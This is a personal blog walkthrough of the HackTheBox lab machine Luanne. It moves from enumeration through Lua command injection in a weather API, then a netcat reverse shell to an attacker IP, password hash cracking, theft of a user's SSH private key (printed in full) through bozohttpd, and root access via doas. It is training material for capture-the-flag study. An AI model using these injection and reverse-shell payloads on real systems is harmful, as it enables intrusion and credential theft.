---
layout: walkthrough
title: HackTheBox - Luanne
date: 2021-03-28 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/luanne.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Luanne --`10.10.10.218`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ nmap -sC -sV 10.10.10.218
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 08:43 EST
Nmap scan report for 10.10.10.218
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.06 seconds
```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `luanne.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by doing some web enumeration for nginx. Navigating to `/robots.txt` provided me with the following output:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img1.png"  style="width: 65%" />
</p>

### Basic Web Enumeration

Okay, I now had an additional directory, but navigating to the directory still returned an 404 error. I decided to use this directory as the base for Gobuster enumeration, the output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ sudo gobuster dir -u http://10.10.10.218/weather/  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.218/weather/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/11 08:55:47 Starting gobuster
===============================================================
/forecast (Status: 200)
===============================================================
2021/03/11 09:02:22 Finished
===============================================================
```

</details>

Navigating to the `/forecast` directory returned the following JSON page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img2.png"  style="width: 80%" />
</p>

I attempted to list the cities by changing the URL to <http://10.10.10.218/weather/forecast/?city=list>. This URL returned the available cities to the user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img3.png"  style="width: 80%" />
</p>

I started by performing some basic injection techniques which you could do with a special characters list and a fuzzing program such as ffuf. Adding a single quotation mark `(')` to the list command threw a Lua error:

```html
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```

This looked promising, I most likely had a way to exploit this code via Lua code execution. Lua makes use of `os.execute` in order to execute system commands, so I just needed to determine the correct sequence of escape characters. After a bit of playing around, I managed to retrieve the user's id with the following payload:

```lua
/weather/forecast/?city=list')%20os.execute('id')--
```

The output of which is shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img4.png"  style="width: 65%" />
</p>

Alright! Since I had basic command execution, I needed to change the payload to a reverse shell. I attempted to use a few Lua payloads from PayloadAllTheThings, but none of them seemed to work. I changed tactics and created a basic `sh` reverse shell since bash did not exist on the machine:

```bash
'rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2>&1|nc 10.10.14.82 1234 >/tmp/fa;'
```

I then ensured that it was URL encoded and executed the command via the `forecast` URL:

```lua
/weather/forecast/?city=list')%20os.execute(%27rm+%2ftmp%2ffa%3bmkfifo+%2ftmp%2ffa%3bcat+%2ftmp%2ffa%7c%2fbin%2fsh+-i+2>%261%7cnc+10.10.14.82+1234+>%2ftmp%2ffa%3b%27)--
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img5.png"  style="width: 80%" />
</p>

## Lateral Movement using httpd
Now that I had access to the machine, I began by performing some basic enumeration:

<details>

```bat
$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
 
hostname:
luanne.htb
 
id
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
 
ifconfig:
vmx0: flags=0x8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        capabilities=7fd80<TSO4,IP4CSUM_Rx,TCP4CSUM_Rx,TCP4CSUM_Tx>
        capabilities=7fd80<UDP4CSUM_Rx,UDP4CSUM_Tx,TCP6CSUM_Rx,TCP6CSUM_Tx>
        capabilities=7fd80<UDP6CSUM_Rx,UDP6CSUM_Tx,TSO6>
        enabled=0
        ec_capabilities=7<VLAN_MTU,VLAN_HWTAGGING,JUMBO_MTU>
        ec_enabled=2<VLAN_HWTAGGING>
        address: 00:50:56:b9:ec:eb
        media: Ethernet autoselect (10Gbase-T)
        status: active
        inet 10.10.10.218/24 broadcast 10.10.10.255 flags 0x0
        inet6 fe80::250:56ff:feb9:eceb%vmx0/64 flags 0x0 scopeid 0x1
lo0: flags=0x8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 33624
        inet 127.0.0.1/8 flags 0x0
        inet6 ::1/128 flags 0x20<NODAD>
        inet6 fe80::1%lo0/64 flags 0x0 scopeid 0x2
 
groups:
_httpd

```
</details>

The directory that I landed in contained a `.htpasswd` file with the following information:

```bat
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

I added the hash to a file in order to crack it. I then ran the file through JohnTheRipper with the Rockyou wordlist which managed to crack the password:

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ john hashes.txt --show
webapi_user:iamthebest

1 password hash cracked, 0 left
```

Using the credentials, I went back to the web application and logged in:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img6.png"  style="width: 65%" />
</p>

Unfortunately, this didn't provide me with any additional information and I was not able to SSH in to the host using the credentials. I continued searching through the host and started with some additional enumeration through the use of linpeas. There were three potential users on the machine which I identified through the `/etc/passwd` file -- root, toor, and r.michaels. I decided to use the password to attempt to log in with any of those accounts, however none of them allowed me to access the host. Additionally, there seemed to be a few interesting files which were writable by my user or the `_httpd` group. These directories are provided below:

* `/var/log/supervisord`
* `/var/supervisord/log`
* `/var/supervisord/run`

The linpeas enumeration also identified a username within the `supervisord.conf` file:

```bat
[+] Finding 'username' string inside key folders (limit 70)
/etc/supervisord.conf:username = user
```

I decided to look in to the `supervisord.conf` file and managed to find some additional credentials:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img8.png"  style="width: 80%" />
</p>

If you recall from the initial nmap scan, there was an additional port open: 9001. Navigating to this port and using the credentials, I was able to log in to the application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img9.png"  style="width: 80%" />
</p>

I didn't find any method of exploiting this software and since the software didn't allow me to tail the log file, I navigated to `/var/supervisord/log` and opened the log file through the host. The file itself was massive but there were a few reoccurring functions which are shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img10.png"  style="width: 80%" />
</p>

### Exploiting bozohttpd

I did a quick search for `/libexec/httpd` and found that it was a simple NetBSD HTTP server: <https://wiki.netbsd.org/tutorials/how_to_setup_a_webserver/>.

> bozohttpd is a small and secure HTTP 1.1 server shipped with NetBSD(/usr/libexec/httpd) by default. It's very simple and there isn't even a configuration file. But it only provides the most basic features.

As shown above, the `r.michaels` user was running `/usr/libexec/httpd` with commands. A breakdown of the commands from the ManPages is shown below: <https://man.netbsd.org/NetBSD-6.0.1/httpd.8>.

* `-X`: Enables directory indexing
* `-u`: Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html.
* `-s`: Forces logging to be set to stderr always.
* `-i`: Causes address to use used as the address to bind daemon mode. If otherwise unspecified, the address used to bind is derived from the myname, which defaults to the name returned by gethostname(3).  Only the last -i option is used.  
* `-P`: Causes httpd to create a pid file in pidfile when run in daemon mode with the -b option.
* `-U`: Causes httpd to switch to the user and the groups of username after initialization. This option, like -t above, causes httpd to clear the environment unless the -e option is given.
* `-b`: Enables daemon mode, where httpd detaches from the current terminal, running in the background and servicing HTTP requests.

Alright, based on that information, it seems as if a web server is being served on port 3001: 

```bat
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
```

Using this information, I created a curl command which abuses the `-u` parameter and replaces the weather resource with an item that I want to serve:

```bat
curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
``` 

In essence, this command is authenticating to the application that is being hosted and from there it is serving a new file which, in this case, retrieves the user's private key. 

<details>

```bat
 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

</details>

I used the private key above to log in to the web application via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img11.png"  style="width: 80%" />
</p>

## Privilege Escalation using r.michaels

With access to the `r.michaels` user, I started doing some basic reconnaissance on the host and found a `backups` directory which contained `devel_backup-2020-09-16.tar.gz.enc`. In order to extract the contents, I decrypted the file and then extracted the contents of the folder using the following commands:

```
netpgp --decrypt --output=/tmp/devel.tar.gz
tar zxvf /tmp/devel.tar.gz
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img12.png"  style="width: 80%" />
</p>

This worked because the home directory contained the `.gnupg` keys. Looking into the backups directory, it contained another `.htpasswd` file which had a different hash to the initial one:

```bat
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```
I added the hash to a file in order to crack it. I ran the file through JohnTheRipper with the Rockyou wordlist which managed to crack the password:

```bat
vagrant@ko:~/Desktop/HackTheBox/Luanne$ john hashes.txt --show
webapi_user:littlebear

1 password hash cracked, 0 left
```

Since it's ksh and the `su` command wasn't available, I authenticated to the root user using `doas`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Luanne/img13.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.